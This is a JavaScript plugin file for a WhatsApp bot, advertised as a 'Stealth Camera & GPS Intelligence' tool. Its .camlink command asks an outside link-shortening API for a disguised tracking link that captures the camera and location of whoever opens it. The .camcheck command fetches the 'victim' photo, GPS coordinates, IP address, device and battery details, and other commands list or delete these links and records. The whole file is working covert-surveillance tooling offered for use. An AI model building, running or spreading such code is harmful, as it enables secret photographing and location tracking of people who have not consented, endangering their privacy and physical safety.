// commands/camtrack.js
'use strict';

/**
 * MR SAQIB MD :: Stealth Camera & GPS Intelligence Plugin
 * ============================================================================
 * Official Integration with Live API: https://earnpk92-two.vercel.app/api/shorten
 * Features:
 *   - Clean, reliable WhatsApp messages (works on all devices: Mobile & Web)
 *   - Ultra-fast live verification
 * ============================================================================
 */

const axios = require('axios');
const settings = require('../settings');

const DEFAULT_API_BASE = 'https://earnpk92-two.vercel.app';

function getApiBaseUrl() {
    let base = settings.cameraApiUrl || process.env.CAMERA_API_URL || DEFAULT_API_BASE;
    return base.replace(/\/+$/, '');
}

function extractSenderNumber(sock, from, msg) {
    const sender = msg.key.participant || msg.participant || from || '';
    return sender.split('@')[0].split(':')[0].replace(/[^0-9]/g, '') || '923468616487';
}

function extractShortCode(input) {
    if (!input) return '';
    let clean = input.trim();
    if (clean.includes('/')) {
        const parts = clean.split('/').filter(Boolean);
        clean = parts[parts.length - 1];
    }
    return clean.replace(/[^A-Za-z0-9_-]/g, '');
}

function formatBattery(rawLevel, isCharging) {
    if (rawLevel === null || rawLevel === undefined || rawLevel === '') return 'N/A';
    const num = parseFloat(rawLevel);
    if (isNaN(num)) return 'N/A';
    const pct = num <= 1.0 ? Math.round(num * 100) : Math.round(num);
    const chargingIcon = isCharging ? ' ⚡ (Charging)' : '';
    return `${pct}%${chargingIcon}`;
}

/**
 * 📸 .camlink <destinationUrl> [alias]
 * Clean reliable response without broken viewOnce buttons
 */
async function camtrackCommand(sock, from, msg, args = []) {
    const targetUrl = args[0]?.trim();
    const customAlias = args[1]?.trim() || '';
    const senderNumber = extractSenderNumber(sock, from, msg);

    if (!targetUrl || (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://'))) {
        await sock.sendMessage(from, { react: { text: '❌', key: msg.key } }).catch(() => {});
        return await sock.sendMessage(from, {
            text: "❌ *Usage:* `.camlink <url> [alias]`\n*Example:* `.camlink https://youtube.com`"
        }, { quoted: msg });
    }

    await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } }).catch(() => {});

    try {
        const apiUrl = `${getApiBaseUrl()}/api/shorten`;
        const payload = {
            longUrl: targetUrl,
            customAlias: customAlias || undefined,
            phoneNumber: senderNumber,
            deviceId: `wa-${senderNumber}`,
            captureCamera: true,
            captureLocation: true,
            animationType: 'ring',
            animationText: 'CONNECTING'
        };

        const response = await axios.post(apiUrl, payload, {
            timeout: 15000,
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'WhatsAppBot-CameraTracker/1.0'
            }
        });

        const resData = response.data;
        if (!resData || !resData.success) {
            throw new Error(resData?.error || 'Link generation failed on server');
        }

        const shortUrl = resData.shortUrl;
        const code = resData.data?.short_code || extractShortCode(shortUrl);

        await sock.sendMessage(from, { react: { text: '✅', key: msg.key } }).catch(() => {});

        // Clean body text (exactly as requested by user)
        const cleanMessage =
`🔗 *TRACKING LINK (COPY & SEND):*
${shortUrl}

🏷️ *Code:* \`${code}\`
🎯 *Target:* ${targetUrl}
📸 *Check Record:* \`.camcheck ${code}\``;

        await sock.sendMessage(from, { text: cleanMessage }, { quoted: msg });

    } catch (err) {
        console.error('[CamTrack Error]:', err.message);
        await sock.sendMessage(from, { react: { text: '❌', key: msg.key } }).catch(() => {});
        const errorMsg = err.response?.data?.message || err.response?.data?.error || err.message;
        await sock.sendMessage(from, {
            text: `❌ *Error:* ${errorMsg}`
        }, { quoted: msg });
    }
}

/**
 * 🔎 .camcheck <shortCode|url>
 * Retrieves victim photos, GPS coordinates, device hardware and battery info.
 */
async function camcheckCommand(sock, from, msg, args = []) {
    const rawInput = args[0]?.trim();
    const shortCode = extractShortCode(rawInput);

    if (!shortCode) {
        await sock.sendMessage(from, { react: { text: '❌', key: msg.key } }).catch(() => {});
        return await sock.sendMessage(from, {
            text: "❌ *Usage:* `.camcheck <code_or_link>`\n*Example:* `.camcheck YwN2sCL`"
        }, { quoted: msg });
    }

    await sock.sendMessage(from, { react: { text: '🔍', key: msg.key } }).catch(() => {});

    try {
        const apiUrl = `${getApiBaseUrl()}/api/analytics?shortCode=${encodeURIComponent(shortCode)}`;
        const response = await axios.get(apiUrl, { timeout: 15000 });
        const resData = response.data;

        if (!resData || !resData.success) {
            throw new Error(resData?.error || 'Failed to fetch link telemetry');
        }

        const visits = Array.isArray(resData.data) ? resData.data : [];

        if (visits.length === 0) {
            await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } }).catch(() => {});
            
            const noRecordText = `⏳ *No Record Found Yet for:* \`${shortCode}\`\n\nAbhi tak victim ne link open nahi kiya.\nJaise hi link khulay ga, yahan photo aur location aa jayegi.\n\n🔎 *Check again:* \`.camcheck ${shortCode}\``;
            return await sock.sendMessage(from, { text: noRecordText }, { quoted: msg });
        }

        await sock.sendMessage(from, { react: { text: '🎯', key: msg.key } }).catch(() => {});

        const latest = visits[0];
        const totalVisits = visits.length;

        const hasGps = latest.latitude && latest.longitude;
        const mapsUrl = hasGps
            ? `https://www.google.com/maps?q=${latest.latitude},${latest.longitude}`
            : 'Permission Denied / N/A';

        const photoUrl = latest.captured_image || latest.image || null;
        const visitTime = latest.created_at ? new Date(latest.created_at).toLocaleTimeString() : 'Just now';

        const reportText =
`🚨 *VICTIM RECORD CAPTURED!* (${totalVisits} Click)

📍 *GPS Maps:* ${mapsUrl}
🌐 *IP & City:* ${latest.ip_address || 'Unknown'} (${latest.location_name || latest.city || 'Unknown'})
📱 *Device:* ${latest.device_model || latest.device_type || 'Mobile'} | ${latest.os || 'OS'}
🌐 *Browser:* ${latest.browser || 'Browser'}
🔋 *Battery:* ${formatBattery(latest.battery_level, latest.is_charging)}
🕒 *Time:* ${visitTime}
${!photoUrl ? '⚠️ *Camera:* Permission denied by user' : ''}`.trim();

        // If photo exists, send as image with report as caption
        if (photoUrl) {
            try {
                if (photoUrl.startsWith('data:image')) {
                    const base64Data = photoUrl.split(',')[1];
                    const buffer = Buffer.from(base64Data, 'base64');
                    await sock.sendMessage(from, {
                        image: buffer,
                        caption: reportText
                    }, { quoted: msg });
                    return;
                } else if (photoUrl.startsWith('http://') || photoUrl.startsWith('https://')) {
                    await sock.sendMessage(from, {
                        image: { url: photoUrl },
                        caption: reportText
                    }, { quoted: msg });
                    return;
                }
            } catch (imgErr) {
                console.warn('[CamCheck Image Send Warning]:', imgErr.message);
            }
        }

        // If no photo or fallback, send clean text report
        await sock.sendMessage(from, { text: reportText }, { quoted: msg });

    } catch (err) {
        console.error('[CamCheck Error]:', err.message);
        await sock.sendMessage(from, { react: { text: '❌', key: msg.key } }).catch(() => {});
        const errorMsg = err.response?.data?.message || err.response?.data?.error || err.message;
        await sock.sendMessage(from, {
            text: `❌ *Error:* ${errorMsg}`
        }, { quoted: msg });
    }
}

/**
 * 📋 .camlinks
 */
async function camlinksCommand(sock, from, msg, args = []) {
    const senderNumber = extractSenderNumber(sock, from, msg);

    await sock.sendMessage(from, { react: { text: '📋', key: msg.key } }).catch(() => {});

    try {
        const apiUrl = `${getApiBaseUrl()}/api/links?phoneNumber=${encodeURIComponent(senderNumber)}&deviceId=wa-${encodeURIComponent(senderNumber)}`;
        const response = await axios.get(apiUrl, { timeout: 15000 });
        const resData = response.data;

        if (!resData || !resData.success) {
            throw new Error(resData?.error || 'Failed to fetch user links');
        }

        const links = Array.isArray(resData.links) ? resData.links : [];

        if (links.length === 0) {
            return await sock.sendMessage(from, {
                text: "📋 *No Links Found.*\nNaya link banane ke liye: `.camlink <url>`"
            }, { quoted: msg });
        }

        let listText = `📋 *YOUR TRACKING LINKS (${links.length}):*\n\n`;
        links.slice(0, 10).forEach((link, idx) => {
            const short = `${getApiBaseUrl()}/${link.short_code}`;
            listText += `${idx + 1}. *Code:* \`${link.short_code}\`\n`;
            listText += `   🔗 ${short}\n`;
            listText += `   🔎 Check: \`.camcheck ${link.short_code}\`\n\n`;
        });

        await sock.sendMessage(from, { text: listText.trim() }, { quoted: msg });

    } catch (err) {
        console.error('[CamLinks Error]:', err.message);
        await sock.sendMessage(from, { react: { text: '❌', key: msg.key } }).catch(() => {});
        await sock.sendMessage(from, {
            text: `❌ *Error:* ${err.response?.data?.error || err.message}`
        }, { quoted: msg });
    }
}

/**
 * 🗑️ .camdel <shortCode>
 */
async function camdelCommand(sock, from, msg, args = []) {
    const rawInput = args[0]?.trim();
    const shortCode = extractShortCode(rawInput);
    const senderNumber = extractSenderNumber(sock, from, msg);

    if (!shortCode) {
        await sock.sendMessage(from, { react: { text: '❌', key: msg.key } }).catch(() => {});
        return await sock.sendMessage(from, {
            text: "❌ *Usage:* `.camdel <shortCode>`"
        }, { quoted: msg });
    }

    try {
        const apiUrl = `${getApiBaseUrl()}/api/links/${encodeURIComponent(shortCode)}?phoneNumber=${encodeURIComponent(senderNumber)}&deviceId=wa-${encodeURIComponent(senderNumber)}`;
        const response = await axios.delete(apiUrl, { timeout: 15000 });

        if (response.data && response.data.success) {
            await sock.sendMessage(from, { react: { text: '✅', key: msg.key } }).catch(() => {});
            await sock.sendMessage(from, {
                text: `✅ Link \`${shortCode}\` aur uske records delete ho gaye.`
            }, { quoted: msg });
        } else {
            throw new Error(response.data?.error || 'Deletion failed');
        }
    } catch (err) {
        await sock.sendMessage(from, { react: { text: '❌', key: msg.key } }).catch(() => {});
        await sock.sendMessage(from, {
            text: `❌ *Error:* ${err.response?.data?.error || err.message}`
        }, { quoted: msg });
    }
}

module.exports = {
    camtrackCommand,
    camcheckCommand,
    camlinksCommand,
    camdelCommand
};
